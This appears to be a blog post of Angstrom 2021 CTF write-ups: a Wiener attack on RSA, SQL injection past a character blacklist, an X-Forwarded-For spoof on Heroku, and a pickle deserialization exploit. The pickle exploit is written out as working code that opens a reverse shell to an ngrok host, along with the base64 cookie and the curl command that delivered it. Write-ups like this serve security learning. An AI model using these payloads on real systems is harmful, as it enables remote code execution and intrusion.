---
title: Angstrom 2021 Writeups
tags: pickle sqlite heroku rsa
---

Hello there,Angstrom 2021 just concluded,with that here are some of writeups that i happened to have a hand in solving and found them interesting.


## Sosig 

![](/img/angstrom/Sosig.png)

we are given the following numbers to retreive the flag from,having no source file we kick into research on RSA encryption,
this challenge has a weird length of the exponent (e), 

on researching we found out it might be vulnerable to a [Weiner Attack](https://en.wikipedia.org/wiki/Wiener%27s_attack)

```
n: 14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853
e: 1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799
c: 13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227
```

We first verify that the Wiener attack can be applied:

![](/img/angstrom/wiener.png)

having confirmed we can use an available Wiener Attack RSA template [here](https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd) 

editing the script with our values and running it gives us the flag 

Alternatively one could use `RSACtfTool`
	
> Flag: actf{d0ggy!!!111!1}

# Web 

## jar 

![](/img/angstrom/Jar.png)



```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```
Notes : 

- from the description we will be dealing with pickle diserialization, but easier XD

- from the docker file `ENV FLAG="actf{REDACTED}"`
and the source 

```python
flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')
```

- if successful the flag location will be in `/proc/self/environ`

### Solution

- with the info gathered i created an exploit that generates a cookie that when insecurely deserialized will help is gain Remote Code Execution  (RCE) on the challenge server 

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
       return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"4.tcp.ngrok.io\",10523));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'", ))

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

- we used a python reverse shell since the challenge was running on flask hence python must be installed

- `4.tcp.ngrok.io` was our static,other alternive static ips can apply 

- set up a local listener back on our machine using `nc -lvnp port`

![](/img/angstrom/rce.png)

using the new malicious cookie we can set it as the cookie using curl

```
curl -k https://jar.2021.chall.actf.co/ --cookie "contents=gANjcG9zaXgKc3lzdGVtCnEAWOkAAABweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCI0LnRjcC5uZ3Jvay5pbyIsMTA1MjMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7J3EBhXECUnEDLg==
```
after running the command we instantly get a reverse shell connection as `nobody`

`cd /`
`grep -rni actf{.*} 2>/dev/null`
gave us the flag

![](shell.png)

> Flag: actf{you_got_yourself_out_of_a_pickle}


 
## Sea of Quills


![](/img/angstrom/quills.png)


```ruby
require 'sinatra'
require 'sqlite3'

set :bind, "0.0.0.0"
set :port, 4567

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )
	

	erb :index
end

get '/quills' do
	erb :quills	

end


post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\""]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

	p @row

	erb :specific
end
```
i personally didn't solve this my teammate [j0kr](https://twitter.com/z0k_r) did

### Solution

![](/img/angstrom/version.png)
initial recon

![](/img/angstrom/tables.png)
dumping tables

![](/img/angstrom/flag.png)
retrieving the flag

## Spoofy 

![](/img/angstrom/Spoofy.png)


```python
from flask import Flask, Response, request
import os
from typing import List

FLAG: str = os.environ.get("FLAG") or "flag{fake_flag}"
with open(__file__, "r") as f:
    SOURCE: str = f.read()

app: Flask = Flask(__name__)


def text_response(body: str, status: int = 200, **kwargs) -> Response:
    return Response(body, mimetype="text/plain", status=status, **kwargs)


@app.route("/source")
def send_source() -> Response:
    return text_response(SOURCE)


@app.route("/")
def main_page() -> Response:
    if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)
```

Notes :

- this was the important part of the source 

```python
@app.route("/")
def main_page() -> Response:
    if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
        if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
            )
        ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
    else:
        return text_response("Please run the server through a proxy.", 400)

```

- inorder to get the flag we are to pass through all the requirements 

let's analyse the code to understand it better 

```python
if "X-Forwarded-For" in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
```
- from top our server will check for 

```python

"X-Forwarded-For" in request.headers
```
if not we trigger a 401

```python
return text_response("I don't trust you >:(", 401)
```
- once we pass that we are met with another check 

```python
 ips: List[str] = request.headers["X-Forwarded-For"].split(", ")
        if not ips:
            return text_response("How is it even possible to have 0 IPs???", 400)
```
our request header `X-Forwarded-For` must have ips sent along with it otherwise we trigger a 400 error in the response 

- if succesful we meet another check

```python
if ips[0] != ips[-1]:
            return text_response(
                "First and last IPs disagree so I'm just going to not serve this request.",
                400,
```
- in our list of ips the server will read the first ip and also the last,if the two don't match we trigger another 400 with error message as `First and last IPs disagree so I'm just going to not serve this request.`

we will get back to it in a minute

to the last part 

```python 
ip: str = ips[0]
        if ip != "1.3.3.7":
            return text_response("I don't trust you >:(", 401)
        return text_response("Hello 1337 haxx0r, here's the flag! " + FLAG)
```
- if we pass the previous check,the server will check the first ip if its equal to 1.3.3.7 
if not we trigger 

```python
return text_response("I don't trust you >:(", 401)
``` 
for a non match ip 

else if the ip matches we get our flag 

... 
back to the second last check now , 
it sounds easy right?
well Yes,and No, 

refer to this stackoverflow question
- [https://stackoverflow.com/q/18264304/](https://stackoverflow.com/q/18264304/)

`....If you try to spoof the IP, your alleged origin is reflected, but - critically - so is your real IP. Obviously, this is all we need, so there's a clear and secure solution for getting the client's IP address on Heroku:
`

`$ curl -H"X-Forwarded-For: 8.8.8.8" http://httpbin.org/ip
{
  "origin": "8.8.8.8, 123.124.125.126"
}`

so apparently once we try to spoof our ip to 1.3.3.7 to meet the requirement,Heroku will append our original ip address to the request, so we fail the ip match, 

after much research we (me and j0kr) came across an article detailing a solution to bypassing the heroku security measure... 
it involved sending the `X-Forwarded-For` headers twice,
as heroku will only append our original ip to the first header, and the server will append our set ip at the end of our original ip as appended by heroku hence passing all the checks to a succesdful ip spoof,getting us the glag

so sending our request as 

```
┌─[@parrot]─[~]
└──╼ $curl -H "X-Forwarded-For: 1.3.3.7" -H "X-Forwarded-For: 2.2.2.2, 1.3.3.7" actf-spoofy.herokuapp.com
Hello 1337 haxx0r, here's the flag! actf{spoofing_is_quite_spiffy}
```

gets us the flag 

> Flag : actf{spoofing_is_quite_spiffy}


PS: More Reading

- [Wiener Attack](https://en.wikipedia.org/wiki/Wiener%27s_attack)

- [wieners-rsa-attack](https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/)

- [Exploiting Python Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

- [exploiting cpickle](https://root4loot.com/post/exploiting_cpickle/)

- [The tale of Clojure, Heroku and X-Forwarded-For](https://jetmind.github.io/2016/03/31/heroku-forwarded.html)
